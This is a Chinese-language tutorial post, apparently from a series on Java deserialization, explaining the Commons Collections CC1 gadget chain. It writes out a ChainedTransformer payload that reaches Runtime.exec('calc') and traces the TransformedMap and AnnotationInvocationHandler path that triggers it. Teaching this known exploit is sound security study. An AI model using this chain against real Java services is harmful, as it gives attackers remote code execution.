---
title: "Java CC · CC1（二）ChainedTransformer 反射数据流"
series: java-cc-deserialization
series_order: 3
date: 2026-04-24 12:00:02 +0800
categories:
  - javaCC
---

## 0. 前言

在第 1 篇中，我们用纯 Java 代码手写了 `TransformerStep` 和 `SimpleChainedTransformer`，理解了"前一步输出 → 后一步输入"的链式调用骨架。

这一篇我们将**引入真正的 Commons Collections 库**，看看 `ConstantTransformer`、`InvokerTransformer`、`ChainedTransformer` 这三个核心组件是如何工作的。

- 理解 `ConstantTransformer` 的"忽略输入，固定返回"
- 理解 `InvokerTransformer` 的反射调用机制
- 用 `LoggingTransformer` 观察每一步的类型变化

## 1. 认识三个核心 Transformer

### 1.1 ConstantTransformer：固定返回

```java
public class ConstantTransformer implements Transformer {
    private final Object iConstant;

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;  // 完全忽略输入，直接返回构造时传入的常量
    }
}
```

### 1.2 InvokerTransformer：反射调用

```java
public class InvokerTransformer implements Transformer {
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
    }
}
```

拿到输入对象，反射调用它的指定方法，返回执行结果。

### 1.3 ChainedTransformer：串联执行

```java
public class ChainedTransformer implements Transformer {
    private final Transformer[] iTransformers;

    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }

    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
}
```

把多个 Transformer 串成一条流水线，前一个的输出成为后一个的输入。

**运行输出**：

```
[step1-constant] input  = ignored-input (java.lang.String)
[step1-constant] output = class java.lang.Class (java.lang.Class)
                          ↑ 类型从 String 变成了 Class
[step2-getMethod] input  = class java.lang.Class (java.lang.Class)
[step2-getMethod] output = public final native java.lang.String java.lang.Class.getName() (java.lang.reflect.Method)
                          ↑ 类型从 Class 变成了 Method
[step3-invoke] input  = public final native java.lang.String java.lang.Class.getName() (java.lang.reflect.Method)
[step3-invoke] output = java.lang.String (java.lang.String)
                          ↑ 类型从 Method 变成了 String
[final] java.lang.String
```

### 3.1 数据流动轨迹

```
"ignored-input" (String)
    ↓ ConstantTransformer(Class.class)  — 忽略输入，返回 Class.class
Class.class (Class)
    ↓ InvokerTransformer("getMethod")  — 反射找 getName 方法
Method对象 (代表 getName)
    ↓ InvokerTransformer("invoke")  — 反射调用 method.invoke(String.class)
"java.lang.String" (String)  — 最终结果
```

**类型在每一步都在变化**，这就是 CC 链的能力——把任意对象沿链条改造成下一个节点需要的形状。

现在我们把目标改成"执行命令"。只需要把链改成：

```java
Transformer[] chain = new Transformer[]{
    new ConstantTransformer(Runtime.class),                       // 提供 Runtime.class
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),               // 获取 getRuntime 方法
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),                       // 调用 invoke 获取 Runtime 实例
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"calc"})                                     // 执行命令
};
```

| 步骤       | 安全版（读类名）                           | 攻击版（执行命令）                            |
| -------- | ---------------------------------- | ------------------------------------ |
| Constant | `ConstantTransformer(Class.class)` | `ConstantTransformer(Runtime.class)` |
| 反射 1     | `getMethod("getName")`             | `getMethod("getRuntime")`            |
| 反射 2     | `invoke(String.class)`             | `invoke(null)` 获取 Runtime 实例         |
| 反射 3     | 无                                  | `exec("calc")` 执行命令                  |

---

## 2. TransformedMap 触发机制

下一步我们接触完整的 TransformedMap：

### 2.1 触发机制

`TransformedMap` 在 `setValue()` 时触发 `checkSetValue()` → `transform()`：

```java
// TransformedMap 核心逻辑
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

`AnnotationInvocationHandler.readObject()` 恰好会遍历 Map 并调用 `setValue()`，所以直接包装一层 `TransformedMap.decorate()` 就能触发。

### 2.2 调用链

```
ObjectInputStream.readObject()
    ↓
AnnotationInvocationHandler.readObject()
    ↓ 遍历 entry → setValue(value)
TransformedMap.checkSetValue(value)
    ↓ valueTransformer.transform(value)
ChainedTransformer.transform(value)
    ↓ ConstantTransformer 忽略 value，返回 Runtime.class
    → getMethod(getRuntime)
    → invoke(null) → Runtime 实例
    → exec("calc")
    ↓
计算器弹出
```
